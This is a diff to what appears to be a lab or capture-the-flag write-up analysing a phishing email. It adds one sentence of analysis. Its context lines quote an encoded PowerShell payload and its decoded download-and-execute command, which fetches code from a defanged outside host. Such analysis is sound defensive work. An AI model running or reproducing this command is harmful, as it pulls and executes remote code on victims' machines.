@@ -108,6 +108,10 @@ Once we execute the command, we can find the answer in the output, as shown in t
 
 The answer is: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
 
+### Analysis
+
+We find that the email contains an attachment that will execute an encoded payload in the command line.
+
 When decoded, we find that the command is as follows: 
 
 iex (new-object net.webclient).downloadstring('hxxp[://]files[.]bpakcaging[.]xyz/update') 
